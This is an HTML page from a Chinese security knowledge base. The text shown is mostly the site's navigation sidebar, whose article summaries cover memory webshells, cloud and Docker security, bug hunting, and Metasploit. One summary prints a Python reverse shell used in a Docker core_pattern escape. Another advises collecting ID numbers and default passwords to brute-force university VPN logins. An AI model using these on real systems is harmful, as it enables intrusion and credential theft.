@@ -1,0 +1,1532 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<title>数据结构之线性表 | mrlxl的知识库</title>
+
+<script>
+(function() {
+  const savedTheme = localStorage.getItem('theme');
+  const html = document.documentElement;
+  if (savedTheme) {
+    html.setAttribute('data-theme', savedTheme);
+  } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+    html.setAttribute('data-theme', 'dark');
+  }
+})();
+</script>
+
+
+      <link rel="stylesheet" href="../../../../css/main.min.1b811b24e25dcc4d4e5cab50b3b6089531edce29a8d36035967c1f4af823ee08.css" integrity="sha256-G4EbJOJdzE1OXKtQs7YIlTHtzimo02A1lnwfSvgj7gg=" crossorigin="anonymous">
+
+
+        <script src="../../../../js/main.c7c382a34629504a0438bf6064d168a2df4a02e88159bc8148fc2bd4f2e54d01.js" integrity="sha256-x8OCo0YpUEoEOL9gZNFoot9KAuiBWbyBSPwr1PLlTQE=" crossorigin="anonymous"></script>
+
+
+
+<script>
+window.MathJax = {
+  tex: {
+    inlineMath: [['$', '$']],
+    displayMath: [['$$', '$$']]
+  }
+};
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+</head>
+<body>
+  <header>
+    <div class="header-inner">
+  
+  <div class="header-left">
+    
+    <img src="../../../../avatar.jpg" alt="Avatar" class="header-avatar">
+    
+    
+    <a href="../../../../" class="header-title">mrlxl的知识库</a>
+    
+    
+    <a href="../../../../" class="header-home-btn" title="首页">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+        <polyline points="9 22 9 12 15 12 15 22"></polyline>
+      </svg>
+    </a>
+  </div>
+
+  
+  <div class="header-right">
+    
+    <a href="https://mrlxl.cn" target="_blank" class="header-about-btn">关于我</a>
+
+    
+    <button id="mobile-search-trigger" class="mobile-search-btn">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"></circle>
+        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+      </svg>
+    </button>
+
+    
+    <div class="theme-switch-wrapper">
+      <label class="theme-switch" for="checkbox">
+        <input type="checkbox" id="checkbox" />
+        <div class="slider round">
+          
+          <svg class="icon-moon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+          </svg>
+          
+          <svg class="icon-sun" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="5"></circle>
+            <line x1="12" y1="1" x2="12" y2="3"></line>
+            <line x1="12" y1="21" x2="12" y2="23"></line>
+            <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+            <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+            <line x1="1" y1="12" x2="3" y2="12"></line>
+            <line x1="21" y1="12" x2="23" y2="12"></line>
+            <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+            <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+          </svg>
+        </div>
+      </label>
+      <script>
+        
+        (function() {
+          const html = document.documentElement;
+          const checkbox = document.getElementById('checkbox');
+          if (html.getAttribute('data-theme') === 'dark') {
+            checkbox.checked = true;
+          }
+        })();
+      </script>
+    </div>
+  </div>
+</div>
+
+  </header>
+  <main>
+    
+<div class="container">
+  <div class="sidebar-left tree">
+  <div class="search-trigger" id="search-trigger">
+    <span class="search-icon">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M15.5 14H14.71L14.43 13.73C15.41 12.59 16 11.11 16 9.5C16 5.91 13.09 3 9.5 3C5.91 3 3 5.91 3 9.5C3 13.09 5.91 16 9.5 16C11.11 16 12.59 15.41 13.73 14.43L14 14.71V15.5L19 20.49L20.49 19L15.5 14ZM9.5 14C7.01 14 5 11.99 5 9.5C5 7.01 7.01 5 9.5 5C11.99 5 14 7.01 14 9.5C14 11.99 11.99 14 9.5 14Z" fill="currentColor"/>
+      </svg>
+    </span>
+    <span class="search-text">搜索文章...</span>
+  </div>
+  <h3>文档</h3>
+  
+  
+
+  
+    
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>web安全进阶</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E5%AE%9E%E6%88%98%E4%B8%8E%E6%9F%A5%E6%9D%80/" class="article-link" data-summary="内存马原理、实战与查杀 引言 我们在漏洞挖掘的时候经常看见大牛们发现一个文件上传漏洞时，上传的不是我们熟知的.php文件，而是.jsp文件。这其实利用的不是我们开始学的时候接触的webshell,而是memshell(内存马)。这篇文章将从基础原理开始，依次介绍Servlet内存马，Spring内存马，Agent内存马，Shiro内存马使用以及内存马的检测与查杀。
+一. Java Web 应用的三大组件 想要理解最常见的三种内存马的类型，那么一定要了解Java Web 应用的三大组件 Servlet，Filter，Listener，下面我将结合工程实例具体介绍：
+1.1 Servlet Servlet 是运行在 Web 容器中的 Java 程序，用于接收客户端请求并生成响应，是 Java Web 中处理业务逻辑的核心组件。
+结合大家都知道的当前已经成为主流的 Spring Boot 我们可能对 Servlet 感到更加熟悉一点，但是不论是 Spring MVC 还是 Spring Boot，本质上都是建立在 Servlet 规范之上的封装，它们内部都通过一个或多个 Servlet 来接收并分发 HTTP 请求。 下图是 Java Web 发展史的“标准主线” 一个 Servlet 工程 = Tomcat &#43; Servlet API &#43; 你写的 Servlet 类 &#43; 映射配置，在工程里代码层如何开发一个 Servlet 完整流程如下： Servlet 和 jsp 的关系：JSP(java servlet page) 是一种以页面为中心的 Servlet 编写方式，最终都会被编译成 Servlet 执行。 当你第一次访问一个 .jsp 文件时，Tomcat 会做这几件事：
+">内存马原理，实战与查杀</a>
+        
+      </div>
+    </li>
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>API安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>云安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="云原生基础知识 正式开始云原生安全的学习，首先了解一下相关的基础知识
+常见名词 记录一些常见的专业术语的意思
+容器 这玩意打CTF的应该都比较熟悉
+Docker 是一个开放源代码软件，是一个开放平台，用于开发应用、交付（shipping）应用、运行应用。Docker允许用户将基础设施（Infrastructure）中的应用单独分割出来，形成更小的颗粒（容器），从而提高交付软件的速度
+Docker 容器与虚拟机类似，但二者在原理上不同:
+容器是将操作系统层虚拟化 虚拟机是虚拟化硬件 按照上面的比较，可以知道容器能更便携高效地利用服务器
+接下来一下Docker官方给出的架构图：
+可以看见里面包括了Docker客户端、Docker容器所在宿主机、Docker镜像仓库三部分
+而宿主机包括了Docker守护进程、本地容器、本地镜像，Docker守护进程Dockerd的作用是侦听Docker API请求和管理Docker对象
+容器编排 容器编排（Container Orchestration）是指自动化容器的部署、管理、扩展和联网，容器编排可以为需要部署和管理成百上千个 Linux 容器和主机的企业提供便利
+常见的容器编排工具方案有 Kubernetes、Docker Swarm 和 Apache Mesos 等
+无服务 无服务（serverless）是一种云原生开发模型，可使开发人员专注构建和运行应用，简单来说，就是开发者不用去管服务器只负责开发就行
+无服务计算产品通常被分为两类，分别是后端即服务（BaaS）和函数即服务（FaaS），其中 FaaS 是 Serverless 的主要实现方式，FaaS 的相关产品主要有 AWS 的 Lambda、Azure 的 Functions Serverless Compute、GCP 的 Firebase Cloud Functions、阿里云的 Function Compute 等
+微服务 微服务（Microservices）是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模块化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的API集相互通信
+服务网格 服务网格（Service Mesh）用于控制应用的不同部分之间如何共享数据，服务网格内置于应用程序中的专用基础架构层，这个可见的基础架构层可以记录应用的不同部分是否能正常交互
+云原生安全 云原生 云 ：运行在云服务器上 原生 ：将应用运行到云上，充分的利用云自身的特点，比如弹性和分布式优势（且业务按照云来设计，而不是简单迁移） 云原生技术有利于各组织在公有云、私有云和混合云等新型动态环境中，构建和运行可弹性扩展的应用。云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API
+云原生安全 云原生安全至少包含了微服务安全、无服务安全、编排平台安全、服务网格安全、容器安全、宿主机安全等等。
+根据云原生环境的构成，面向云原生环境的安全体系可以概括为以下三个层面：
+容器安全 编排系统安全 云原生应用安全：包括了微服务、无服务、服务网格、零信任体系、API 安全等等 另外除了这些和云原生环境相关的技术之外，云原生安全还包含了一些传统安全的内容，比如宿主机的安全等等。
+">云原生基础知识</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%AD%A6%E4%B9%A0/" class="article-link" data-summary="云服务学习 云服务就是云上的服务，比如从云厂商（AWS、阿里云）买来的服务
+国内云厂商：
+阿里云 腾讯云 华为云 天翼云 Ucloud 金山云 &amp;amp;hellip;&amp;amp;hellip; 国外云厂商：
+AWS GCP Azure &amp;amp;hellip;&amp;amp;hellip; 每个云厂商对云服务的叫法不同，这里以AWS的为例：
+S3对象存储（Simple Storage Service），可以简单理解为网盘，略有区别 EC2弹性计算服务（Elastic Computer Cloud），简单理解为云上的虚拟机 RDS云数据库（Relational Database Service），简单理解为云上数据库 IAM身份管理和访问管理（Identity and Access Management），简单理解为云控制台上的一套身份管理服务，可以用来管理每个子账号的权限 综上来看，其实可以简单看作一些本地的功能/服务放到了云上，那么就会产生对应的风险，值得研究
+在下文的案例图片中，笔者可能会更多用国内厂商（比如aliyun）进行举例，漏洞实例使用TerraformGoat靶场进行演示
+学习顺序参考https://wiki.teamssix.com/
+对象存储 对象存储（Object-Based Storage），也可以叫做面向对象的存储，现在也有不少厂商直接把它叫做云存储，很经典的就是Amazon S3 (Simple Storage Service) 简单存储服务，是 Amazon 的公开云存储服务，与之对应的协议被称为 S3 协议，目前 S3 协议已经被视为公认的行业标准协议，因此目前国内主流的对象存储厂商基本上都会支持 S3 协议
+Amazon S3标准中，对对象存储中可以有多个桶（Bucket），而对象（object）存放在桶里，对象包含三个key、Data、Metadata部分：
+Key指存储桶中的唯一标识符，例如一个 URL 为：https://yuy0ung.s3.ap-northeast-2.amazonaws.com/d0g3，这里的 yuy0ung 是存储桶 Bucket 的名称，/d0g3 就是 Key Data很好理解，就是存储的数据本体 Metadata意味元数据，可以简单理解为数据的标签、描述之类的信息（区别于传统的文件存储，在传统的文件存储中这类信息是直接封装在文件里的，而云上有了元数据的存在，可以大大的加快对象的排序、分类和查找） 操作使用Amazon S3的方式大致如下：
+AWS 控制台操作 AWS 命令行工具操作 AWS SDK 操作 REST API 操作，通过 REST API，可以使用 HTTP 请求创建、提取和删除存储桶和对象 接下来记录S3相关攻击手法
+">云服务学习</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/%E8%AF%86%E5%88%AB%E8%99%9A%E6%8B%9F%E6%9C%BAdocker%E5%92%8Ck8s%E9%9B%86%E7%BE%A4%E7%8E%AF%E5%A2%83/" class="article-link" data-summary="识别虚拟机、Docker和K8s集群环境 一、基础 随着云原生应用不断普及，在我们getshell之后，我们还需要判断该shell是否处于虚拟环境中，并判断该虚拟环境的类型，通常情况下，shell的虚拟环境可能有如下三个类型：
+虚拟机 虚拟机是指在一台物理服务器上运行的多个虚拟主机实例，每个虚拟主机实例都拥有自己的环境和资源，通常用于提供Web托管服务
+Docker Docker是一种虚拟化技术，利用容器化的方式将应用程序及其依赖项打包成独立、轻量级的环境，实现快速部署、高效运行和跨平台运行的功能
+K8s Kubernetes（通常简写为K8s）是一个开源的容器编排平台，通过自动化部署、扩展和管理容器化应用，实现高可用性、弹性和灵活性。它提供了集群管理、服务发现、负载均衡等功能，让用户可以更轻松地管理容器化应用的生命周期
+二、思路 如果shell处于虚拟机、Docker或K8s集群环境中，我们需要对环境进行识别，并采取针对性的措施，比如：
+虚拟机：通常考虑横向移动来扩大攻击效果
+Docker：通常先进行容器逃逸，再进行内网横向移动
+K8s：通常先尝试接管集群，以获取对容器和集群资源的完全控制
+三、识别 首先判断当前shell是否采用了虚拟化技术：
+systemd-detect-virt	#识别系统虚拟机（VM）、容器还是裸机上运行 在确认采用了虚拟化技术后，常有如下检测方法可以快速识别当前所处环境类型
+查看主机名和进程 容器的主机名默认随机生成的字符串，PID1非系统进程，可初步判断当前为容器环境
+hostname	#查看主机名 ps aux	#显示系统上所有用户的详细进程信息 通过利用cgroup信息的差异 通过查看cgroup信息，可以判断当前环是否是虚拟机、Docker容器或K8s集群:
+cat /proc/1/cgroup	#用于查看进程ID为1的系统进程（通常是Init进程）所属的cgroup信息，即用于控制和管理进程资源使用的容器技术 也可以针对性的查找关键词，例如针对Docker字符串：
+grep &amp;amp;#39;docker&amp;amp;#39; /proc/1/cgroup	#查找是否存在‘Docker’字符串 检查根目录下.dockerenv文件
+通过判断根目录下的.dockerenv文件是否存在，确认当前环是否为容器环境:
+ls -alh/dockerenv	#列出/dockerenv目录下的所有文件和目录，并显示详细信息以及人类可读的文件大小 通过检查挂载信息
+通过检查挂载信息，推测当前环境是虚拟机、Docker容器还是K8s集群:
+mount lgrep &amp;amp;#39;/type&amp;amp;#39;	#从当前系统中列出所有已挂载的文件系统，并使用grep命令筛选出包含/type路径的挂载信息 查看硬盘信息
+通过查看硬盘信息，推断当前环境是否为容器环境:
+fdisk -l #列出系统上所有磁盘的分区信息 获取当前环境的文件系统和挂载点信息
+获取当前环境的文件系统和挂载点信息，用来判断是否容器环境:
+df -h	#显示文件系统的磁盘使用情况和挂载点信息 通过了解环境变量包含的信息
+通过检查环境变量，了解特定环境的信息:
+env #显示当前系统环境中的所有环境变量 四、反制 对于防守者而言，通过了解攻击者在云原生环境中可能采取的这些信息探测行为，可以建立有效的告警机制，以便及早发现潜在的攻击行为
+">识别虚拟机、Docker和K8s集群环境</a>
+        
+      </div>
+    </li>
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>docker安全</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8%E6%A6%82%E8%A7%88/" class="article-link" data-summary="Docker安全概览 前面的文章已经简单介绍了docker容器相关概念，docker的使用对于接触过ctf出题的人来说还是相对熟悉了，这里也不做过多介绍，接下来从安全的角度来分析一下docker
+Docker面临的风险 镜像风险 镜像的内容是由用户进行配置的，所以有可能造成一些安全问题
+不安全的第三方组件 比如在镜像中引入了一些具有严重nday的组件，毫无疑问，这个镜像也就存在漏洞了
+不安全的镜像 类似供应链攻击，在公共镜像仓库比如 Docker Hub 里，会存在一些有漏洞的镜像或者恶意镜像，如果使用了这些镜像那就存在风险了
+敏感信息泄漏 如果在镜像开发完毕后没有删除自己配置的api key、AK/SK等，那么如果别人获取到该镜像就可能造成敏感信息泄漏
+活动中的容器风险 容器在运行时也有一些能够用户自定义的配置，这些配置不当同样可能造成风险
+不安全的容器应用 比如映射出来的端口的服务存在漏洞，那么自然会导致风险
+不受限制的资源共享 容器运行在宿主机上，容器必然要使用宿主机的各种 CPU、内存等资源，如果没有对容器进行资源使用限制，那么就存在宿主机被资源耗尽的风险
+不安全的配置/挂载 正常来说，容器有两大隔离机制：
+linux命名空间：实现文件系统、网络、进程、主机名等方面的隔离 linux控制组：实现CPU、内存、硬盘等方面的隔离 而配置不当会导致容器本身隔离机制失效：
+&amp;amp;ndash;privileged：使容器内的 root 权限和宿主机上的 root 权限一致，权限隔离被打破 &amp;amp;ndash;net=host：使容器与宿主机处于同一网络命名空间，网络隔离被打破 &amp;amp;ndash;pid=host：使容器与宿主机处于同一进程命令空间，进程隔离被打破 &amp;amp;ndash;volume /:/host：宿主机根目录被挂载到容器内部，文件系统隔离被打破 容器管理程序接口风险 Docker 守护进程主要监听 UNIX socket 和 TCP socket，默认情况下，Docker 只会监听 UNIX socket
+UNIX socket 风险主要在于Docker守护进程默认以宿主机的root权限运行，说到这里其实熟悉后渗透的师傅都能想到，可以利用这一点进行提权，除此之外我们还可以利用这点进行容器逃逸，这类风险有两个利用场景
+普通用户被加到Docker用户组内
+如果普通用户被加入到 Docker 用户组内，那么普通用户也将有权限访问 Docker UNIX socket，如果攻击者获得了这个普通用户权限，就可以借助 Docker 提权到 root 用户权限
+Unix socket挂载到容器内部
+有时为了实现容器内部管理容器，可能会将 Docker UNIX socket 挂载到容器内部，那么如果该容器被入侵，渗透测试人员就可以借助这个 socket 进行容器逃逸获得宿主机 root 权限
+">Docker安全概览</a>
+        
+      </div>
+    </li>
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/%E4%BA%91%E5%AE%89%E5%85%A8/docker%E5%AE%89%E5%85%A8/docker%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95%E5%A4%A7%E5%85%A8/" class="article-link" data-summary="Docker逃逸手法大全 Docker相关安全风险更多集中在Docker逃逸方面
+和基础的后渗透思路一样，在获取docker的权限后需要对docker进行信息搜集，判断是否具有满足docker逃逸的条件
+判断是否为容器环境 在之前的文章中也提到过，可以通过查看cgroup信息等方法来判断，可以参考我的这篇笔记：快速识别虚拟主机、Docker和K8s集群环境
+不过查看cgroup目录的方法似乎只对cgroup v1有用，所以推荐使用查看根目录.dockerenv的办法：
+ls -al /.dockerenv 确认为容器环境之后，就可以查看是否具有满足逃逸的条件了，接下来从基础概念、环境搭建、信息搜集、漏洞利用等方面记录一下docker逃逸的一些tricks，当然如果比较懒，也可以试试开源的自动检测脚本：项目地址：https://github.com/teamssix/container-escape-check
+挂载宿主机procfs逃逸 基础概念 procfs（/proc）是一个伪文件系统，反映了系统内进程以及其他组件的状态，其中有很多敏感文件
+user namespace是linux的一项安全功能，允许在容器中映射和隔离用户ID
+而在容器内默认启用root权限，且默认没有开启User Namespace时，容器中的root用户与宿主机的root用户UID会一致（均为0），在这种情况下，如果将procfs挂载到不受控的容器中，则可能会导致容器逃逸，这里运用到一个tricks：
+从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行
+环境搭建 创建容器并挂载/proc目录：
+docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 搭建完毕
+信息搜集 如果发现了两个core_pattern文件，则可能就是挂载了宿主机的procfs：
+find / -name core_pattern 漏洞利用 找到当前容器在主机下的绝对路径：
+cat /proc/mounts | xargs -d &amp;amp;#39;,&amp;amp;#39; -n 1 | grep workdir 可以看到绝对路径为/var/lib/docker/overlay2/8c1a0695756000c2afc1ba95bf605dda88027b937c937e8f2527b597447f37ac/work
+接下来安装vim和gcc：
+apt-get update -y &amp;amp;amp;&amp;amp;amp; apt-get install vim gcc -y 然后创建一个python脚本用于反弹shell：
+#!/usr/bin/python3 import os import pty import socket lhost = &amp;amp;#34;xx.xx.xx.xx&amp;amp;#34; lport = 7777 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(&amp;amp;#34;HISTFILE&amp;amp;#34;, &amp;amp;#39;/dev/null&amp;amp;#39;) pty.spawn(&amp;amp;#34;/bin/bash&amp;amp;#34;) # os.remove(&amp;amp;#39;/tmp/.shell.py&amp;amp;#39;) s.close() if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: main() 赋予执行权限：
+">Docker逃逸手法大全</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>反序列化</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>渗透实战</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/%E6%96%B0%E6%89%8B%E5%B0%8F%E7%99%BD%E4%B8%80%E4%B8%AA%E6%9C%88%E5%86%85%E6%8B%BF%E4%B8%8B%E4%B8%80%E5%BC%A0%E6%BC%8F%E6%B4%9E%E8%AF%81%E4%B9%A6/" class="article-link" data-summary="新手小白在一个月内拿下一张漏洞报送证书 如图所示，我从开始挖漏洞，在一个月内拿下了两个证书站以及三十多个rank。 作为一名见习白帽子，我使用的手段基本没有什么技术门槛，下面我就介绍一二。
+首先我认为不同的情况下的漏洞挖掘难度是不同的,通常是： 证书站点&amp;amp;gt;非证书站点&amp;amp;gt;有测试账号的站点
+一.没有测试账号的情况 没有测试账号，我们通常只能在这个网站的外围打转，功能点较少，耐心一些，可能很久都不会出结果或者重复不通过
+1.1 攻击面绘制 你的攻击范围越广就比别人多了更多的机会，这个时候需要先做一波攻击面绘制：
+1.1.1 查备案信息 比如南开大学的网站资产就能查到有8个域名 1.1.1 子域名收集 查到有8个域名之后，对每个域名做一次子域名收集，我常用的就是 oneforall 这个工具，可以看见南开一个一级域名就能查出一千多个子域名，当然工具都会有误报的现象，需要自己筛查，这里也推荐一个工具 aquatone ，能够把每一个url进去访问截图，你只用看截图就行了 1.2 简单三板斧 在外围挖，功能点少，测试技巧简单来说就三样
+1.2.1 抓包改包 对于你觉得存在参数传递的，可疑的信息传递过程，都可以进行抓包改包测试，如下图，就是仅通过学号参数传递就能获取身份证信息 1.2.2 未授权测试 未授权测试主要是路径的测试，一是对你觉得可能存在的路径做FUZZ,二是查看JS是否存在什么可疑路径，如下图1，即是成都信息工程大学的一个接口泄露，直接对应角色权限的Cookie,能够实现越权。如下图2，即是成都理工大学的一个未授权访问界面，能够直接以学生权限管理实习系统 1.2.3 sql注入测试 遇到可能存在与数据库交互的地方，先手动判断一下，然后进行自动化测试，使用自己收集的字典或者sqlmap之类的工具进行针对的测试，如下图是一个sql注入漏洞,注入点为userid 二.有测试账号的情况 2.1 获取一个测试账号 高校VPN登录存在的普遍问题就是弱口令，现目前大部分高校默认密码都采用了身份证后六位，用户名一般都是学号，最传统的获取方式就是要我们先做一波信息收集
+搜索谷歌黑语法：
+site:xxx.edu.cn sfz filetype: pdf|xls|doc site:xxx.edu.cn 初始密码 site:xxx.edu.cn xh 收集到一定的信息之后，即可对登录框进行爆破（有参数加密的做做js逆向，ip限制的挂挂代理，有验证码测试一下相关漏洞，不要高并发）
+或者发挥下你的人脉，直接把你好朋友的账号密码要过来即可
+2.2 进入后台 后台的功能点就太多了，过于冗杂，这里贴几个简单案例，慢慢感悟
+2.2.1 后台OA系统密码大量泄露 该接口泄露大量userid 该接口通过userid能够获取密码 2.2.2 后台人员管理越权篡改角色权限 附言 以上介绍的方法都是最基础的方法的运用，在实际过程中用到的各种小技巧要在挖掘过程中自行体会总结。 在开始挖漏洞之前，必要的基础知识（比如top10漏洞的测试方法）是一定要熟练掌握的，下面分享一张前置知识路线图。 还有，总是有人和我说挖不到漏洞，新手挖漏洞阶段，考的就是个细心，每天挖一两个小时不挖了，怎么会挖的到，建议一天要长时间的挖掘，盯着一个站点一直看才能够得到提高。
+">新手小白一个月内拿下一张漏洞证书</a>
+        
+      </div>
+    </li>
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>安全管理</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+</ul>
+
+      </div>
+    </li>
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>后渗透</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+  
+  
+    <li>
+      <span class="tree-toggle collapsed"></span>
+      <span class="section-link" style="cursor: pointer;"><strong>内网渗透</strong></span>
+      <div class="tree-children hidden" style="display: none;">
+        
+
+
+
+
+  
+  
+  
+    
+  
+
+
+<ul class="tree-list">
+  
+    <li>
+      <div class="tree-item-wrapper">
+        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
+        <a href="../../../../blog/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/msfcs%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="article-link" data-summary="MSF&amp;amp;amp;CS介绍与使用 免责声明：本文所有内容仅供学习交流，请勿用于违法活动
+Metasploit Framework（MSF） Metasploit是ruby语言开发的一个基于命令行操作的渗透测试框架，我们可以查找，利用和验证漏洞，附带数千个已知的软件漏洞，并保持持续更新。Metasploit可以用来信息收集、漏洞探测、漏洞利用等渗透测试的全流程
+一、msf体系框架 msf的整体框架如下：
+我们重点关注模块部分
+模块组织按照不同的用途分为7种类型的模块（Modules）：
+辅助模块（Aux)：负责信息收集、扫描、嗅探、指纹识别、口令猜测和Dos攻击等功能 渗透攻击模块（Exploits)：利用系统漏洞进行攻击，里面有每一个具体漏洞的攻击方法 后渗透攻击模块（Post)：在取得目标系统远程控制权限后，进行一系列的后渗透攻击动作，如获取敏感信息、跳板攻击等操作 攻击载荷模块（payloads)：成功exploit之后，真正在目标系统执行的代码或指令 编码器模块（Encoders)：主要对payload进行加密，最终达到躲避AntiVirus检查的目的 空指令模块（Nops)：主要作用是提高payload稳定性及维持大小 免杀模块(Evasion)：可以用来创建木马文件 二、Metasploit基本使用 kali中自带了msf，可以直接使用
+Metasploit启动 msf有一个用于存储信息收集数据的关系型数据库Postgresql，可以自主选择是否开启
+msf有三种启动方式：
+先启动Postgresql数据库，再启动Metasploit
+service postgresql start msfconsole 不启动数据库，直接启动Metasploit
+msfconsole 启动Postgresql的同时启动Metasploit
+msfdb run 也可以直接在kali左上角工具点击启动，实际上是自动执行了命令：
+sudo msfdb init &amp;amp;amp;&amp;amp;amp; msfconsole 由于Postgresql数据库的默认端口为5432，所以可以查看该端口来判断是否开启Postgresql数据库：
+netstat -pantu | grep 5432 Metasploit常用命令 在msfconsole中，输入help可以看见各种命令的介绍
+show展示 用于展示可用模块，有效参数是：all，encoders，nops，exploits，payloads，auxiliary, post，plugins，info，options
+展示模块时，每个模块都会有一个名为Rank的字段，该列代表该模块的可靠性
